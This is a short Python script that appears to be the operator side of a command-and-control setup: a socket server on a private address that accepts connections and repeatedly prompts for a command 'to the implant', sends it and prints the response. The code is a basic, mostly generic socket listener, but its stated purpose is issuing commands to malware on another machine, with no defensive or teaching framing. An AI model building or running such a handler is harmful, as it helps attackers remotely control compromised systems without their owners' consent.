#!/usr/bin/env python3
import socket

s = socket.socket()
host = "192.168.20.9"  # Get local machine name
port = 12345  # Reserve a port for your service
s.bind((host, port))  # Bind to the port

s.listen(5)  # Now wait for client connection
while True:
    c, addr = s.accept()  # Establish connection with client
    print(f"Connection from {addr} has been established.")
    message = input("Enter command to the implant")
    if message == "exit":
        break
    c.send(message.encode())
    print(c.recv(1024))
c.close()  # Close the connection
